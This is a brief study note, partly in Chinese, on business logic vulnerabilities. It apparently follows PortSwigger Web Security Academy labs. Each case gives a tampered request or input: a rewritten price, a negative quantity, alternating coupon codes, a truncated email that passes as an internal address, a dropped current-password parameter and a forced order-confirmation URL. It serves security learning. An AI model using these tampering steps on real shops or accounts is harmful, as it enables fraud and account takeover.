Business logic vulnerabilities are flaws in the design and implementation of an application that allow an attacker to elicit unintended behavior. This potentially enables attackers to manipulate legitimate functionality to achieve a malicious goal. These flaws are generally the result of failing to anticipate unusual application states that may occur and, consequently, failing to handle them safely.

## 1. Principle

通过目标的逻辑缺陷绕过某些限制

### 1.1. Location

任何需要进行校验的位置

## 2. Test

### 2.1. Client-Side Controls

商品价格可由请求包控制

```
productId=1&redir=PRODUCT&quantity=1&price=100
```

### 2.2. High-Level

商品数量修改为复数可从总价中减去对应的金额

```
productId=7&redir=PRODUCT&quantity=-10
```

### 2.3. Inconsistent Security Controls

控制面板仅允许使用内部邮箱的用户访问, 而绑定邮箱不需要校验

```
admin@dontwannacry.com
```

### 2.4. Flawed Enforcement

一个优惠码仅可使用一次, 交替使用多个优惠码可绕过限制

```
Code	Reduction
NEWCUST5	-$5.00
SIGNUP30	-$401.10
NEWCUST5	-$5.00
SIGNUP30	-$401.10
NEWCUST5	-$5.00
SIGNUP30	-$401.10
NEWCUST5	-$5.00
SIGNUP30	-$401.10
```

### 2.5. Integer Overflow

int 计数的范围是 -2,147,483,648 ~ 2,147,483,647 (某些网站可能会限制为 0 ~ 2,147,483,647)

当超过最大值 2,147,483,647 时会从最小值开始计算

### 2.6. Exceptional Input

目标网站校验邮箱时仅保留 255 个字符, 可使用超长字符串将自己的邮箱伪造为内部邮箱

```
very-long-string@dontwannacry.com.YOUR-EMAIL-ID.web-security-academy.net
```

### 2.7. Dual-Use Endpoint

修改其它用户名密码时发现原密码参数可删除

```
csrf=cRyG0g19wuZgUOOEk2MmdJLGnFJNjKoR&username=administrator&current-password=peter&new-password-1=121212&new-password-2=121212
```

### 2.8. Insufficient Workflow Validation

正常购买商品后发现一个隐藏

```
Location: /cart/order-confirmation?order-confirmed=true
```

购买时在请求添加这个参数即可支付成功

```
GET /cart/order-confirmation?order-confirmed=true
```

### 2.9. Flawed State Machine

登录时丢弃某些请求包可直接升级为管理员

```
GET /role-selector
```

### 3.0. 四舍五入

充值 0.016 到账 0.02

---

**References**

- [Business logic vulnerabilities](https://portswigger.net/web-security/logic-flaws)